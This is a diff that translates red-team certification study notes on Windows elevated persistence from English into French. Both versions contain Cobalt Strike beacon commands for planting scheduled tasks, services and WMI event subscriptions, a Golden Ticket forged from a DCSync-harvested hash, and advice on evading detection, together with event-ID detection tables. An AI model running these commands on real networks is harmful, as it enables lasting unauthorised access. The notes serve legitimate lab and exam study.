@@ -1,39 +1,39 @@
-# Elevated Persistence  
+# Elevated Persistence — Accès privilégié  
 
 * Scheduled Task
 * Windows Service
 * Windows Management Instrumentation WMI
 
->Chapter 10: Elevated Persistence
+> Chapitre 10 — Elevated Persistence
 
-Once elevated access is obtained, establish a second persistence layer to survive patching/mitigation of the initial elevation vector. All techniques here require admin/SYSTEM context.
+Après l'obtention d'un accès privilégié, mettre en place une deuxième couche de Persistence pour conserver l'accès si le vecteur initial est corrigé. Toutes les techniques de ce chapitre nécessitent un contexte admin/SYSTEM.
 
-**Prefer disk-less or low-footprint methods — OPSEC score counts.**
+**Privilégier les méthodes sans écriture sur disque ou avec peu d'artefacts : le score OPSEC compte.**
 
 ---
 
-## OPSEC Quick Reference
+## Référence rapide OPSEC
 
-| Technique | OPSEC | Disk Artifact | Survives Reboot | Event IDs |
+| Technique | OPSEC | Artefact disque | Résiste au redémarrage | Event IDs |
 |-----------|-------|---------------|-----------------|-----------|
-| **Golden Ticket** | SAFE | None (attacker desktop only) | Until krbtgt rotation | 4662 (DCSync only, at harvest) |
-| **DPERSIST1 (Golden Cert)** | SAFE | None | Until CA cert expires | Cert enrollment (at harvest) |
-| **WMI Persistent Event** | CAUTION | Payload EXE on disk | Yes (WMI repo) | 5861, Sysmon 19/20/21 |
-| **Scheduled Task (powerpick)** | CAUTION | Task XML in Tasks\ | Yes | 4698 |
-| **Scheduled Task (SharPersist)** | CAUTION | Task XML in Tasks\ | Yes | 4698 |
-| **Scheduled Task (shell schtasks)** | **UNSAFE** | Task XML in Tasks\ | Yes | 4698 + cmd.exe child |
-| **Windows Service (SharPersist)** | CAUTION | Service binary | Yes | 7045, 4697 |
-| **Windows Service (shell sc)** | **UNSAFE** | Service binary | Yes | 7045 + cmd.exe child |
+| **Golden Ticket** | SAFE | Aucun (Attacker Desktop uniquement) | Jusqu'à la rotation de krbtgt | 4662 (DCSync lors de la collecte) |
+| **DPERSIST1 (Golden Cert)** | SAFE | Aucun | Jusqu'à l'expiration du certificat CA | Certificate Enrollment (lors de la collecte) |
+| **WMI Persistent Event** | CAUTION | Payload EXE sur disque | Oui (WMI repository) | 5861, Sysmon 19/20/21 |
+| **Scheduled Task (powerpick)** | CAUTION | Task XML dans Tasks\ | Oui | 4698 |
+| **Scheduled Task (SharPersist)** | CAUTION | Task XML dans Tasks\ | Oui | 4698 |
+| **Scheduled Task (shell schtasks)** | **UNSAFE** | Task XML dans Tasks\ | Oui | 4698 + child process cmd.exe |
+| **Windows Service (SharPersist)** | CAUTION | Binaire service | Oui | 7045, 4697 |
+| **Windows Service (shell sc)** | **UNSAFE** | Binaire service | Oui | 7045 + child process cmd.exe |
 
-**Exam preference order:** Golden Ticket > DPERSIST1 > WMI Event > Scheduled Task (powerpick) > Service (SharPersist) > Service/Task via shell (never)
+**Ordre indiqué pour l'examen :** Golden Ticket > DPERSIST1 > WMI Event > Scheduled Task (powerpick) > Service (SharPersist) > Service/Task via shell (à éviter).
 
 ---
 
-## 1 — Scheduled Tasks
+## Scheduled Tasks
 
-The Task Scheduler can execute payloads as SYSTEM on a trigger (boot, logon, time, event).
+Le Task Scheduler peut exécuter des payloads sous SYSTEM selon un déclencheur : démarrage, connexion, horaire ou événement.
 
-### OPSEC-CAUTION — Preferred Methods
+### OPSEC-CAUTION — Méthodes privilégiées
 
 ```cs
 // Method A: powerpick (no child process — unmanaged PS in beacon thread)
@@ -46,7 +46,7 @@ beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersis
 beacon> powerpick Get-ScheduledTask -TaskName 'WindowsDebugHelper' | Select-Object TaskName,State
 ```
 
-### OPSEC-UNSAFE — Avoid on Exam
+### OPSEC-UNSAFE — À éviter à l'examen
 
 ```cs
 // UNSAFE — spawns cmd.exe as child of beacon (visible in process tree)
@@ -56,7 +56,7 @@ beacon> shell schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\beacon.e
 beacon> shell schtasks /query /tn "WindowsUpdate" /fo LIST /v
 ```
 
-### Cleanup
+### Cleanup — Nettoyage
 
 ```cs
 // OPSEC-CAUTION — use powerpick, not shell
@@ -66,20 +66,20 @@ beacon> powerpick Unregister-ScheduledTask -TaskName 'WindowsDebugHelper' -Confi
 // beacon> shell schtasks /delete /tn "WindowsDebugHelper" /f
 ```
 
-### Detection Footprint
+### Artefacts de détection
 
-- Event ID **4698** — Scheduled task created
-- Event ID **4702** — Scheduled task updated
-- Task XML written to `C:\Windows\System32\Tasks\<name>`
-- Sysmon Event ID **11** (file create) on task XML path
+- Event ID **4698** — Création d'une Scheduled Task
+- Event ID **4702** — Modification d'une Scheduled Task
+- Fichier XML de la tâche écrit dans `C:\Windows\System32\Tasks\<name>`
+- Sysmon Event ID **11** (création de fichier) sur le chemin XML de la tâche
 
 ---
 
-## 2 — Windows Services
+## Windows Services
 
-Creates a persistent service that runs a payload as SYSTEM at boot. **Generates Event 7045 — high-fidelity SOC alert. Avoid on exam unless last resort.**
+Crée un service persistant exécutant un payload sous SYSTEM au démarrage. **Génère l'Event 7045, signal d'alerte exploitable par le SOC : à éviter pendant l'examen sauf dernier recours.**
 
-### OPSEC-CAUTION — Least Noisy Method
+### OPSEC-CAUTION — Méthode moins bruyante
 
 ```cs
 // execute-assembly SharPersist (fork & run — no cmd.exe, but Event 7045 still fires)
@@ -89,7 +89,7 @@ beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersis
 beacon> powerpick Get-Service -Name 'WindowsUpdateHelper' | Select-Object Name,Status,StartType
 ```
 
-### OPSEC-UNSAFE — Avoid on Exam
+### OPSEC-UNSAFE — À éviter à l'examen
 
 ```cs
 // UNSAFE — every shell command spawns cmd.exe as child of beacon
@@ -99,7 +99,7 @@ beacon> shell sc start "SvcUpdate"
 beacon> shell sc qc SvcUpdate
 ```
 
-### Cleanup
+### Cleanup — Nettoyage
 
 ```cs
 // OPSEC-CAUTION — powerpick
@@ -111,28 +111,28 @@ beacon> powerpick (Get-WmiObject -Class Win32_Service -Filter "Name='WindowsUpda
 // beacon> shell sc delete SvcUpdate
 ```
 
-### Detection Footprint
+### Artefacts de détection
 
-- Event ID **7045** — New service installed (System log) — **high-fidelity alert, always fires**
-- Event ID **4697** — Service installed (Security log, if auditing enabled)
-- Sysmon Event ID **13** (registry value set) — `HKLM\SYSTEM\CurrentControlSet\Services\`
-- Service binary written to disk
+- Event ID **7045** — Installation d'un service (System log), **alerte à forte valeur dans ces notes**
+- Event ID **4697** — Installation de service (Security log, si audit activé)
+- Sysmon Event ID **13** (modification Registry) — `HKLM\SYSTEM\CurrentControlSet\Services\`
+- Binaire du service écrit sur disque
 
 ---
 
-## 3 — WMI Persistence (Eventing)
+## WMI Persistence — Événements
 
-WMI persistent events survive reboots, run as SYSTEM, and store in the WMI repository (not a regular file on disk). Three components required:
+Les événements persistants WMI résistent au redémarrage, s'exécutent sous SYSTEM et sont enregistrés dans le WMI repository, pas dans un fichier standard. Trois composants sont nécessaires :
 
-| Component | Class | Purpose |
+| Composant | Classe | Fonction |
 |-----------|-------|---------|
-| **Event Filter** | `__EventFilter` | WQL query defining the trigger condition |
-| **Event Consumer** | `CommandLineEventConsumer` | Action to take when filter matches |
-| **Filter-to-Consumer Binding** | `__FilterToConsumerBinding` | Links filter to consumer |
+| **Event Filter** | `__EventFilter` | Requête WQL définissant le déclencheur |
+| **Event Consumer** | `CommandLineEventConsumer` | Action effectuée lorsque le filtre correspond |
+| **Filter-to-Consumer Binding** | `__FilterToConsumerBinding` | Lien entre filtre et consumer |
 
-### Primary Method — Lab Technique (psinject, OPSEC-CAUTION)
+### Méthode principale — Lab avec psinject (OPSEC-CAUTION)
 
-This is the method from the CRTO course lab. `psinject` into the SYSTEM beacon's own process — no `powershell.exe` spawn, no fork & run sacrificial process:
+Méthode du lab CRTO : `psinject` dans le processus du Beacon SYSTEM, sans lancer `powershell.exe` ni de processus temporaire fork & run :
 
 ```cs
 // Step 1: import the persistence script into beacon's PS runspace
@@ -147,9 +147,9 @@ beacon> powerpick Get-WmiObject -Namespace root/subscription -Class CommandLineE
 beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
 ```
 
-### Alternative — Inline powerpick (OPSEC-CAUTION)
+### Alternative — powerpick inline (OPSEC-CAUTION)
 
-If `WmiPersistence.ps1` is unavailable, install all three WMI objects inline via `powerpick`:
+Si `WmiPersistence.ps1` est indisponible, créer directement les trois objets WMI avec `powerpick` :
 
 ```cs
 // 1. Event Filter — trigger on Event ID 1502 (GPO refresh)
@@ -162,9 +162,9 @@ beacon> powerpick $c = Set-WmiInstance -Namespace root/subscription -Class Comma
 beacon> powerpick Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$f; Consumer=$c}
 ```
 
-### Alternative Trigger Conditions
+### Autres conditions de déclenchement
 
-Swap the `Query` string in the Event Filter to change what fires the beacon:
+Modifier la chaîne `Query` de l'Event Filter pour changer le déclencheur du Beacon :
 
 ```powershell
 # Event 1502 — GPO computer configuration refresh (lab default, ~90 min automatic)
@@ -177,9 +177,9 @@ Swap the `Query` string in the Event Filter to change what fires the beacon:
 "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'svchost.exe'"
 ```
 
-### Remote Trigger — Port Knock via Firewall Drop (Advanced)
+### Déclencheur distant — Port Knock via Firewall Drop (avancé)
 
-**Concept:** enable Firewall Packet Drop auditing → Event ID 5152 fires on dropped packets → filter on a specific attacker-controlled port → beacon executes when attacker sends a packet.
+**Principe :** activer l'audit des paquets bloqués par le Firewall → l'Event ID 5152 apparaît → filtrer sur un port contrôlé par l'attaquant → le Beacon se déclenche à l'envoi d'un paquet.
 
 ```cs
 // OPSEC-UNSAFE — shell spawns cmd.exe; note this for reference only
@@ -193,9 +193,9 @@ beacon> powerpick $f = Set-WmiInstance -Namespace root/subscription -Class __Eve
 // Then bind consumer as above
 ```
 
-> **Exam note:** Port knock technique is advanced and noisy during setup (`auditpol` change is detectable). Use only if WMI event-code trigger isn't firing reliably.
+> **Note d'examen :** le Port Knock est avancé et sa configuration est détectable (modification `auditpol`). Dans ces notes, il n'est envisagé que si le déclencheur WMI habituel ne fonctionne pas.
 
-### Enumerate / Verify
+### Énumérer / Vérifier
 
 ```cs
 beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __EventFilter
@@ -203,7 +203,7 @@ beacon> powerpick Get-WmiObject -Namespace root/subscription -Class CommandLineE
 beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
 ```
 
-### Test Trigger
+### Tester le déclencheur
 
 ```cs
 // OPSEC-CAUTION — spawns gpupdate.exe as child process (legitimate, acceptable for testing)
@@ -211,7 +211,7 @@ beacon> execute gpupdate /target:computer /force
 // DNS beacon should appear within a few seconds
 ```
 
-### Cleanup
+### Cleanup — Nettoyage
 
 ```cs
 // Method A — via psinject (matches install method)
@@ -226,20 +226,20 @@ beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __FilterToCo
 beacon> rm windbg.exe
 ```
 
-### Detection Footprint
+### Artefacts de détection
 
-- Event ID **5861** — New WMI activity registered (WMI-Activity/Operational log)
-- WMI repository modified: `C:\Windows\System32\wbem\Repository\`
-- Sysmon Event ID **19** — WMI filter creation
-- Sysmon Event ID **20** — WMI consumer creation
-- Sysmon Event ID **21** — WMI filter-to-consumer binding
-- No Event 7045 (no service created)
+- Event ID **5861** — Nouvelle activité WMI enregistrée (WMI-Activity/Operational log)
+- Modification du WMI repository : `C:\Windows\System32\wbem\Repository\`
+- Sysmon Event ID **19** — Création de WMI filter
+- Sysmon Event ID **20** — Création de WMI consumer
+- Sysmon Event ID **21** — Création du binding filtre-consumer
+- Pas d'Event 7045 (aucun service créé)
 
 ---
 
-## 4 — Golden Ticket (Best OPSEC — No Binary on Disk)
+## Golden Ticket — OPSEC sans binaire sur disque
 
-Once you have the `krbtgt` AES256 hash (from DCSync), you can forge DA-level Kerberos tickets indefinitely — no binary deployed to any target machine.
+Une fois le hash AES256 de `krbtgt` récupéré via DCSync, le scénario permet de forger des tickets Kerberos de niveau Domain Admin sans déployer de binaire sur la cible.
 
 ```cs
 // Prerequisite: DCSync for krbtgt hash (OPSEC-CAUTION — Event 4662 on DC)
@@ -257,17 +257,17 @@ beacon> run klist
 beacon> ls \\lon-dc-1\c$
 ```
 
-**Why this is the best persistence:**
-- No process runs on target machines
-- No file written to any target host
-- Ticket lives only on attacker desktop
-- Survives target machine reboots, patch cycles, IR response
-- Only detection opportunity was Event 4662 at DCSync time
-- Valid until `krbtgt` password rotation (default 60 days; rarely done in exam environments)
+**Pourquoi cette Persistence est privilégiée dans les notes :**
+- Aucun processus supplémentaire lancé sur les machines cibles
+- Aucun fichier écrit sur les hôtes cibles
+- Le ticket se trouve uniquement sur l'Attacker Desktop
+- Peut rester utilisable après des redémarrages, correctifs et actions d'Incident Response
+- Les notes mentionnent l'Event 4662 lors du DCSync comme point de détection principal
+- Reste pertinent jusqu'à la rotation du mot de passe `krbtgt` (60 jours par défaut selon ces notes)
 
 ---
 
-## OPSEC Decision Tree
+## Arbre de décision OPSEC
 
 ```
 Need elevated persistence?
@@ -293,25 +293,25 @@ Need elevated persistence?
 
 ---
 
-## Command Safety Summary
+## Récapitulatif de sécurité des commandes
 
-| Operation | SAFE command | UNSAFE command (avoid) |
+| Opération | Commande SAFE | Commande UNSAFE (à éviter) |
 |-----------|-------------|----------------------|
-| Create WMI subscription | `psinject [PID] x64 Add-WmiPersistence` | — |
-| Create WMI inline | `powerpick Set-WmiInstance ...` | — |
-| Create scheduled task | `powerpick Register-ScheduledTask ...` | `shell schtasks /create ...` |
-| Create service | `execute-assembly SharPersist.exe -t service ...` | `shell sc create ...` |
-| Query service | `powerpick Get-Service -Name ...` | `shell sc qc ...` |
-| Query scheduled task | `powerpick Get-ScheduledTask -TaskName ...` | `shell schtasks /query ...` |
-| Stop service | `powerpick Stop-Service -Name ... -Force` | `shell sc stop ...` |
-| Delete service | `powerpick (Get-WmiObject -Class Win32_Service -Filter ...).Delete()` | `shell sc delete ...` |
-| Delete scheduled task | `powerpick Unregister-ScheduledTask -TaskName ... -Confirm:$false` | `shell schtasks /delete ...` |
-| Remove WMI subscription | `powerpick Get-WmiObject ... \| Remove-WmiObject` | — |
-| Audit policy change | `powerpick Set-ItemProperty HKLM:\... AuditFilteringPlatformPacketDrop 3` | `shell auditpol /set ...` |
+| Créer une WMI subscription | `psinject [PID] x64 Add-WmiPersistence` | — |
+| Créer des objets WMI inline | `powerpick Set-WmiInstance ...` | — |
+| Créer une Scheduled Task | `powerpick Register-ScheduledTask ...` | `shell schtasks /create ...` |
+| Créer un service | `execute-assembly SharPersist.exe -t service ...` | `shell sc create ...` |
+| Interroger un service | `powerpick Get-Service -Name ...` | `shell sc qc ...` |
+| Interroger une Scheduled Task | `powerpick Get-ScheduledTask -TaskName ...` | `shell schtasks /query ...` |
+| Arrêter un service | `powerpick Stop-Service -Name ... -Force` | `shell sc stop ...` |
+| Supprimer un service | `powerpick (Get-WmiObject -Class Win32_Service -Filter ...).Delete()` | `shell sc delete ...` |
+| Supprimer une Scheduled Task | `powerpick Unregister-ScheduledTask -TaskName ... -Confirm:$false` | `shell schtasks /delete ...` |
+| Supprimer une WMI subscription | `powerpick Get-WmiObject ... \| Remove-WmiObject` | — |
+| Modifier la politique d'audit | `powerpick Set-ItemProperty HKLM:\... AuditFilteringPlatformPacketDrop 3` | `shell auditpol /set ...` |
 
-> **Rule:** Any `shell` or `run` command spawns `cmd.exe` as a child of the beacon process. Visible in process tree, generates child process events. Replace with `powerpick`, `execute-assembly`, or `inline-execute` equivalents wherever possible.
+> **Règle donnée par les notes :** `shell` ou `run` peut créer `cmd.exe` comme child process du Beacon, visible dans l'arbre des processus. Privilégier les équivalents `powerpick`, `execute-assembly` ou `inline-execute` lorsqu'ils existent.
 
 ---
 
-*Source: ZPS CRTO Course — Chapter 10: Elevated Persistence*
-*Last updated: 2026-04-17*
+*Source : cours ZPS CRTO — Chapitre 10 : Elevated Persistence*
+*Dernière mise à jour indiquée : 17/04/2026*
